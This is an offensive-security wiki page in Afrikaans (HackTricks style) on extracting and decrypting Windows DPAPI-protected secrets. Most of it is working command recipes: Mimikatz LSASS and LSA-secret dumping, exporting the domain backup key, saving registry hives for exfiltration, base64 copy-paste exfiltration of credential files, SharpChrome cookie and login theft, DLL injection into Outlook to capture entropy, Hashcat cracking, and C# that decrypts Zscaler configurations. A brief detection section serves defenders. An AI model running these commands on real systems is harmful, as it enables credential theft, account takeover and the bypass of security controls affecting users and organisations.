# DPAPI - Uittrekking van Wagwoorde

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik in die Windows-bedryfstelsel gebruik vir die **simmetriese enkripsie van asimmetriese private sleutels**, deur gebruikers- of stelselgeheime as 'n belangrike bron van entropie te benut. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met 'n sleutel wat afgelei is van die gebruiker se aanmeldgeheime, of, vir stelsel-enkripsie, van die stelsel se domeinverifikasiegeheime, en skakel dus uit dat ontwikkelaars die enkripsiesleutel self moet beveilig.

Die mees algemene manier om DPAPI te gebruik is deur die **`CryptProtectData` en `CryptUnprotectData`** funksies, wat toepassings toelaat om data veilig te enkripteer en te dekripteer binne die sessie van die proses wat tans aangemeld is. Dit beteken dat die geënkripteerde data slegs deur dieselfde gebruiker of stelsel gedekripteer kan word wat dit geënkripteer het.

Boonop aanvaar hierdie funksies ook 'n **`entropy` parameter** wat tydens enkripsie en dekripsie gebruik sal word; daarom, om iets te dekripteer wat met hierdie parameter geënkripteer is, moet jy dieselfde entropiewaarde verskaf wat tydens enkripsie gebruik is.

### Generering van gebruikersleutel

Die DPAPI genereer 'n unieke sleutel (genoem **`pre-key`**) vir elke gebruiker gebaseer op hul geloofsbriewe. Hierdie sleutel word afgelei van die gebruiker se wagwoord en ander faktore en die algoritme hang af van die tipe gebruiker, maar eindig as 'n SHA1. Byvoorbeeld, vir domeingebruikers **hang dit af van die NTLM-hash van die gebruiker**.

Dit is veral interessant omdat as 'n aanvaller die gebruiker se wagwoord-hash kan verkry, hulle kan:

- **Dekriptiseer enige data wat met DPAPI geënkripteer is** met daardie gebruiker se sleutel sonder om enige API te kontak
- Probeer die **wagwoord te kraak** aflyn deur te probeer om die geldige DPAPI-sleutel te genereer

Boonop, elke keer wanneer 'n gebruiker data met DPAPI enkripteer, word 'n nuwe **master key** gegenereer. Hierdie master key is die een wat werklik gebruik word om data te enkripteer. Elke master key word met 'n **GUID** (Globally Unique Identifier) geassosieer wat dit identifiseer.

Die master sleutels word gestoor in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gids, waar `{SID}` die Security Identifier van daardie gebruiker is. Die master sleutel word gestoor geënkripteer deur die gebruiker se **`pre-key`** en ook deur 'n **domain backup key** vir herstel (dus word dieselfde sleutel twee keer geënkripteer gestoor deur twee verskillende maniere).

Let daarop dat die **domain key used to encrypt the master key is in the domain controllers and never changes**, dus as 'n aanvaller toegang tot die domain controller het, kan hulle die domain backup key ophaal en die master sleutels van alle gebruikers in die domein dekripteer.

Die geënkripteerde blobs bevat die **GUID van die master key** wat gebruik is om die data te enkripteer in sy headers.

> [!TIP]
> DPAPI-geënkripteerde blobs begin met **`01 00 00 00`**

Vind master sleutels:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Masjien/Stelsel sleutelgenerering

Dit is die sleutel wat deur die masjien gebruik word om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, 'n spesiale sleutel wat slegs die SYSTEM gebruiker kan toegang kry. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self toeganklik moet wees, soos masjien-vlak credentials of stelsel-wye geheime.

Let wel dat hierdie sleutels **nie 'n domain backup het nie**, dus is hulle slegs plaaslik toeganklik:

- **Mimikatz** kan dit benader deur LSA secrets te dump met die opdrag: `mimikatz lsadump::secrets`
- Die secret word in die registry gestoor, so 'n administrator kan **die DACL permissions wysig om toegang te kry**. Die registry-pad is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is ook moontlik. Byvoorbeeld, as administrator op die teiken, stoor die hives en exfiltrateer hulle:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Dan op jou ontledingsmasjien, haal die DPAPI_SYSTEM LSA secret uit die hives en gebruik dit om machine-scope blobs te ontsleutel (scheduled task passwords, service credentials, Wi‑Fi profiles, ens.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Gegewens wat deur DPAPI beskerm word

Onder die persoonlike data wat deur DPAPI beskerm word, is:

- Windows creds
- Internet Explorer en Google Chrome se wagwoorde en outo-voltooiingdata
- E-pos en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke, en Windows Vault, insluitend enkripsiesleutels
- Wagwoorde vir remote desktop-verbindinge, .NET Passport, en private sleutels vir verskeie enkripsie- en verifiëringsdoeleindes
- Netwerkwagwoorde wat deur Credential Manager bestuur word en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger, en meer
- Gesiferde blobs binne die register
- ...

Stelsel-beskermde data sluit in:
- Wifi-wagwoorde
- Geskeduleerde taakwagwoorde
- ...

### Opsies vir die uittrekking van master-sleutels

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met plaaslike admin-regte is dit moontlik om **toegang tot die LSASS-geheue** te kry om die DPAPI-master-sleutels van al die aangeslote gebruikers en die SYSTEM-sleutel uit te trek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Indien die gebruiker lokale admin-bevoegdhede het, kan hulle toegang kry tot die **DPAPI_SYSTEM LSA secret** om die machine master keys te ontsleutel:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die wagwoord of die NTLM-hash van die gebruiker bekend is, kan jy **ontsleutel die gebruiker se master-sleutels direk**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy in 'n sessie as die gebruiker is, is dit moontlik om die DC te vra vir die **backup key to decrypt the master keys using RPC**. As jy local admin is en die gebruiker aangemeld is, kan jy hiervoor **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Toegang tot DPAPI Encrypted Data

### Vind DPAPI Encrypted data

Algemene gebruikers se **beskermde lêers** is te vind in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kyk ook om `\Roaming\` na `\Local\` te verander in bogenoemde paaie.

Voorbeelde van enumerering:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-versleutelde blobs in die lêerstelsel, register en B64-blobs vind:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Neem kennis dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om sensitiewe data soos cookies met DPAPI te ontsleutel.

#### Chromium/Edge/Electron vinnige resepte (SharpChrome)

- Huidige gebruiker, interaktiewe ontsleuteling van saved logins/cookies (werk selfs met Chrome 127+ app-bound cookies omdat die ekstra sleutel opgelos word uit die gebruiker se Credential Manager wanneer dit in gebruikerskonteks uitgevoer word):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-analise wanneer jy slegs lêers het. Eers onttrek die AES state key uit die profiel se "Local State" en gebruik dit dan om die cookie DB te ontsleutel:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage wanneer jy die DPAPI domain backup key (PVK) en admin op die target host het:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- As jy 'n gebruiker se DPAPI prekey/credkey (van LSASS) het, kan jy password cracking oorslaan en profieldata direk ontsleutel:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Aantekeninge
- Nuwer Chrome/Edge-weergawes mag sekere cookies stoor met "App-Bound" enkripsie. Offline-dekripsie van daardie spesifieke cookies is nie moontlik sonder die bykomende app-bound sleutel nie; voer SharpChrome uit onder die teiken‑gebruiker se konteks om dit outomaties te bekom. Sien die Chrome security blog post hieronder.

### Toegangssleutels en data

- **Gebruik SharpDPAPI** om credentials uit DPAPI-geënkripteerde lêers van die huidige sessie te kry:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials-inligting** soos die versleutelde data en die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Toegang tot masterkeys**:

Dekodeer 'n masterkey van 'n gebruiker wat die **domain backup key** versoek, met behulp van RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI**-instrument ondersteun ook hierdie argumente vir masterkey-ontsleuteling (let op dat dit moontlik is om `/rpc` te gebruik om die domein se backup key te kry, `/password` om 'n plaintext password te gebruik, of `/pvk` om 'n DPAPI domain private key file te spesifiseer...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dekodeer data met behulp van 'n masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-hulpmiddel ondersteun ook hierdie argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps` dekripsie (let wel dat dit moontlik is om `/rpc` te gebruik om die domein se rugsteun-sleutel te kry, `/password` om 'n platteks-wagwoord te gebruik, `/pvk` om 'n DPAPI domain private key-lêer te spesifiseer, `/unprotect` om die huidige gebruiker se sessie te gebruik...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Gebruik 'n DPAPI prekey/credkey direk (geen wagwoord nodig nie)

As jy LSASS kan dump, openbaar Mimikatz dikwels 'n per-logon DPAPI key wat gebruik kan word om die gebruiker se masterkeys te ontsleutel sonder om die plaintext password te ken. Gee hierdie waarde direk aan die tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Ontsleutel sekere data met die **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

As jy die slagoffer se SID en wagwoord (of NT-hash) het, kan jy DPAPI masterkeys en Credential Manager blobs volledig offline ontsleutel met Impacket’s dpapi.py.

- Identifiseer artefakte op skyf:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Ooreenstemmende masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- As file transfer tooling onbetroubaar is, base64 die lêers on-host en kopieer die uitvoer:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrypt die masterkey met die gebruiker se SID en password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Gebruik die ontsleutelde masterkey om die credential blob te ontsleutel:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Hierdie werkvloei herwin dikwels domeinbewyse wat deur toepassings wat die Windows Credential Manager gebruik gestoor is, insluitend administratiewe rekeninge (bv. `*_adm`).

---

### Hantering van Opsionele Entropie ("Derdeparty-entropie")

Sommige toepassings gee 'n bykomende **entropy**-waarde aan `CryptProtectData`. Sonder hierdie waarde kan die blob nie ontsleutel word nie, selfs al is die korrekte masterkey bekend. Dit maak die verkryging van die entropy dus noodsaaklik wanneer daar op geloofsbriewe geteiken word wat op hierdie wyse beskerm word (bv. Microsoft Outlook, sommige VPN-kliente).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is 'n user-mode DLL wat die DPAPI-funksies binne die teikenproses hooks en deursigtig enige opsionele entropy wat verskaf word opneem. Om EntropyCapture in **DLL-injection**-modus teen prosesse soos `outlook.exe` of `vpnclient.exe` te laat loop sal 'n lêer uitset wat elke entropy-bufer in kaart bring met die oproepproses en blob. Die vasgevangde entropy kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) voorsien word om die data te ontsleutel.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft het vanaf Windows 10 v1607 (2016) 'n **context 3** masterkey-formaat bekendgestel. `hashcat` v6.2.6 (Desember 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-accelerated cracking van gebruikerswagwoorde direk vanaf die masterkey-lêer toelaat. Aanvallers kan dus word-list of brute-force attacks uitvoer sonder om met die teikenstelsel te kommunikeer.

`DPAPISnoop` (2024) outomatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die tool kan ook Credential- en Vault-blobs ontleed, dit met cracked keys ontsleutel en cleartext passwords uitvoer.

### Toegang tot data van ander masjiene

In **SharpDPAPI and SharpChrome** kan jy die **`/server:HOST`**-opsie gebruik om toegang tot 'n afgeleë masjien se data te kry. Natuurlik moet jy toegang tot daardie masjien hê, en in die volgende voorbeeld word aangeneem dat die **domain backup encryption key** bekend is:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander gereedskap

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n hulpmiddel wat die uittrekking van alle gebruikers en rekenaars uit die LDAP-gids en die uittrekking van die domain controller backup key via RPC outomatiseer. Die skrip sal dan die IP-adresse van alle rekenaars oplos en 'n smbclient op alle rekenaars uitvoer om alle DPAPI blobs van alle gebruikers te haal en alles met die domain backup key te dekripteer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die uit LDAP onttrekte rekenaarslys kan jy elke subnet vind, selfs al het jy dit nie geken nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan outomaties geheime wat deur DPAPI beskerm word dump. Die 2.x-vrystelling het ingesluit:

* Parallelle versameling van blobs van honderde hosts
* Ontleding van **context 3** masterkeys en outomatiese Hashcat-cracking-integrasie
* Ondersteuning vir Chrome "App-Bound" geïnkripteerde cookies (sien volgende afdeling)
* 'n nuwe **`--snapshot`** modus om eindpunte herhaaldelik te poll en nuut-geskepte blobs te diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is 'n C#-parser vir masterkey/credential/vault-lêers wat Hashcat/JtR-formate kan uitset en opsioneel kraking outomaties kan aanroep. Dit ondersteun ten volle machine- en user masterkey-formate tot Windows 11 24H1.


## Algemene opsporingsmetodes

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante gidse.
- Veral vanaf 'n netwerkshare soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke gereedskap om LSASS-geheue te betree of masterkeys te dump.
- Event **4662**: *An operation was performed on an object* – kan gekorreleer word met toegang tot die **`BCKUPKEY`** voorwerp.
- Event **4673/4674** wanneer 'n proses *SeTrustedCredManAccessPrivilege* versoek (Credential Manager)

---
### 2023-2025 kwesbaarhede & ekosisteemveranderinge

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 'n Aanvaller met netwerktoegang kon 'n domain member mislei om 'n kwaadwillige DPAPI backup key te kry, wat dekripsie van user masterkeys moontlik maak. Gepatch in November 2023 kumulatiewe opdatering – administrateurs moet verseker dat DCs en werkstasies volledig gepatch is.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) het die legacy DPAPI-only beskerming vervang met 'n ekstra sleutel gestoor onder die gebruiker se **Credential Manager**. Offline dekripsie van cookies vereis nou beide die DPAPI masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die ekstra sleutel herstel wanneer dit met gebruiker-kontext uitgevoer word.


### Gevalstudie: Zscaler Client Connector – Aangepaste entropie afgeleide van SID

Zscaler Client Connector stoor verskeie konfigurasielêers onder `C:\ProgramData\Zscaler` (e.g. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke lêer is geënkripteer met **DPAPI (Machine scope)** maar die verskaffer verskaf **aangepaste entropie** wat *tydens uitvoering bereken* word in plaas van op skyf gestoor.

Die entropie word herbou uit twee elemente:

1. 'n hard-coded secret ingebed in `ZSACredentialProvider.dll`.
2. Die **SID** van die Windows-rekening waaraan die konfigurasie behoort.

Die algoritme wat deur die DLL geïmplementeer is, is ekwivalent aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim in 'n DLL ingebed is wat vanaf die skyf gelees kan word, **enige plaaslike aanvaller met SYSTEM-regte kan die entropie vir enige SID hergenereer** en die blobs offline ontsleutel:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Ontsleuteling lewer die volledige JSON-konfigurasie, insluitend elke **toestel-houdingskontrole** en die verwagte waarde daarvan — inligting wat baie waardevol is wanneer 'n omseiling aan die kliëntkant probeer word.

> WENK: die ander geënkripteerde artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word beskerm deur DPAPI **sonder** entropie (`16` zero bytes). Hulle kan dus direk ontsleutel word met `ProtectedData.Unprotect` sodra SYSTEM-voorregte verkry is.

## Verwysings

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
